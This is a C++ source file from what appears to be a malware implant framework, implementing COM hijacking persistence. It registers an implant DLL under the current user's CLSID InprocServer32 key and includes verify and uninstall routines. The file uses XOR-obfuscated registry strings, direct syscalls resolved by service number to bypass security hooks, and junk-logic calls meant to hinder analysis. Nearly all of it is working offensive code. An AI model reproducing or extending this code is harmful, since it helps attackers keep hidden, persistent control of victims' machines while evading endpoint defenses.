#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include "../evasion/JunkLogic.h"
#include <vector>
#include <sstream>

namespace persistence {

namespace {
    // XOR strings (key 0x5A)
    const wchar_t kClsidPathEnc[] = { 'S'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, 'w'^0x5A, 'a'^0x5A, 'r'^0x5A, 'e'^0x5A, '\\'^0x5A, 'C'^0x5A, 'l'^0x5A, 'a'^0x5A, 's'^0x5A, 's'^0x5A, 'e'^0x5A, 's'^0x5A, '\\'^0x5A, 'C'^0x5A, 'L'^0x5A, 'S'^0x5A, 'I'^0x5A, 'D'^0x5A, '\\'^0x5A }; // Software-Classes-CLSID
    const wchar_t kInprocEnc[] = { 'I'^0x5A, 'n'^0x5A, 'p'^0x5A, 'r'^0x5A, 'o'^0x5A, 'c'^0x5A, 'S'^0x5A, 'e'^0x5A, 'r'^0x5A, 'v'^0x5A, 'e'^0x5A, 'r'^0x5A, '3'^0x5A, '2'^0x5A }; // InprocServer32
    const wchar_t kThreadingModelEnc[] = { 'T'^0x5A, 'h'^0x5A, 'r'^0x5A, 'e'^0x5A, 'a'^0x5A, 'd'^0x5A, 'i'^0x5A, 'n'^0x5A, 'g'^0x5A, 'M'^0x5A, 'o'^0x5A, 'd'^0x5A, 'e'^0x5A, 'l'^0x5A }; // ThreadingModel
    const wchar_t kBothEnc[] = { 'B'^0x5A, 'o'^0x5A, 't'^0x5A, 'h'^0x5A }; // Both
}

bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& clsid) {
    evasion::JunkLogic::GenerateEntropy();

    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    if (ntOpenKeySsn == 0xFFFFFFFF || ntSetValueKeySsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return false;

    evasion::JunkLogic::PerformComplexMath();

    std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
    UNICODE_STRING uHkcu;
    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hHkcu = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, (UINT_PTR)&hHkcu, (UINT_PTR)(KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_CREATE_SUB_KEY), (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);

    if (!NT_SUCCESS(status)) return false;

    evasion::JunkLogic::ScrambleMemory();

    std::wstring relativePath = utils::DecryptW(kClsidPathEnc, 23) + clsid + L"\\" + utils::DecryptW(kInprocEnc, 14);
    HANDLE hKey = NULL;
    status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);

    InternalDoSyscall(ntCloseSsn, (UINT_PTR)hHkcu, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);

    if (NT_SUCCESS(status)) {
        UNICODE_STRING uEmpty = {0, 0, NULL};
        InternalDoSyscall(ntSetValueKeySsn, (UINT_PTR)hKey, (UINT_PTR)&uEmpty, 0, (UINT_PTR)REG_SZ, (UINT_PTR)implantPath.c_str(), (UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), 0, 0, 0, 0, 0);

        std::wstring tm = utils::DecryptW(kThreadingModelEnc, 14);
        UNICODE_STRING uTm;
        uTm.Buffer = (PWSTR)tm.c_str();
        uTm.Length = (USHORT)(tm.length() * sizeof(wchar_t));
        uTm.MaximumLength = uTm.Length + sizeof(wchar_t);

        std::wstring tmVal = utils::DecryptW(kBothEnc, 4);
        InternalDoSyscall(ntSetValueKeySsn, (UINT_PTR)hKey, (UINT_PTR)&uTm, 0, (UINT_PTR)REG_SZ, (UINT_PTR)tmVal.c_str(), (UINT_PTR)((tmVal.length() + 1) * sizeof(wchar_t)), 0, 0, 0, 0, 0);

        InternalDoSyscall(ntCloseSsn, (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return true;
    }

    return false;
}

bool ComHijacker::Verify(const std::wstring& clsid) {
    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;

    std::wstring fullPath = L"\\Registry\\User\\" + sid + L"\\" + utils::DecryptW(kClsidPathEnc, 23) + clsid + L"\\" + utils::DecryptW(kInprocEnc, 14);

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    UNICODE_STRING uPath;
    uPath.Buffer = (PWSTR)fullPath.c_str();
    uPath.Length = (USHORT)(fullPath.length() * sizeof(wchar_t));
    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hKey = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, (UINT_PTR)&hKey, (UINT_PTR)KEY_READ, (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
    if (NT_SUCCESS(status)) {
        InternalDoSyscall(ntCloseSsn, (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return true;
    }
    return false;
}

bool ComHijacker::Uninstall(const std::wstring& clsid) {
    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;
    std::wstring fullPath = L"\\Registry\\User\\" + sid + L"\\" + utils::DecryptW(kClsidPathEnc, 23) + clsid;
    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntDeleteKeySsn = resolver.GetServiceNumber("NtDeleteKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
    UNICODE_STRING uPath;
    uPath.Buffer = (PWSTR)fullPath.c_str();
    uPath.Length = (USHORT)(fullPath.length() * sizeof(wchar_t));
    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hKey = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, (UINT_PTR)&hKey, (UINT_PTR)KEY_ALL_ACCESS, (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
    if (NT_SUCCESS(status)) {
        std::wstring subPath = fullPath + L"\\" + utils::DecryptW(kInprocEnc, 14);
        UNICODE_STRING uSubPath;
        uSubPath.Buffer = (PWSTR)subPath.c_str();
        uSubPath.Length = (USHORT)(subPath.length() * sizeof(wchar_t));
        uSubPath.MaximumLength = uSubPath.Length + sizeof(wchar_t);
        OBJECT_ATTRIBUTES subAttr;
        InitializeObjectAttributes(&subAttr, &uSubPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
        HANDLE hSubKey = NULL;
        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, (UINT_PTR)&hSubKey, (UINT_PTR)KEY_ALL_ACCESS, (UINT_PTR)&subAttr, 0, 0, 0, 0, 0, 0, 0, 0))) {
            InternalDoSyscall(ntDeleteKeySsn, (UINT_PTR)hSubKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
            InternalDoSyscall(ntCloseSsn, (UINT_PTR)hSubKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        }
        status = InternalDoSyscall(ntDeleteKeySsn, (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        InternalDoSyscall(ntCloseSsn, (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    }
    return NT_SUCCESS(status);
}

} // namespace persistence
